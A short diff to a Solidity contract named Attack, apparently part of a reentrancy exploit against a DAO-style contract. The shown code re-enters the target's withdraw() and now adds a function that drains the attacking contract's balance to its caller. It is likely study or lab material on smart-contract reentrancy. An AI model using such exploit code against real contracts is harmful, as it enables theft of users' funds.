@@ -28,8 +28,9 @@ contract Attack{
             mydao.withdraw();
         }
     }
-    // receive() external payable{
-    //     (bool sent, ) = msg.sender.call{value: 0.1}("");
-    //     require(sent, "Failed to withdraw sender's balance");
-    // }
+    function withdraw() public {
+        // Withdraw user's balance
+        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
+        require(sent, "Failed to withdraw sender's balance");
+    }
 }
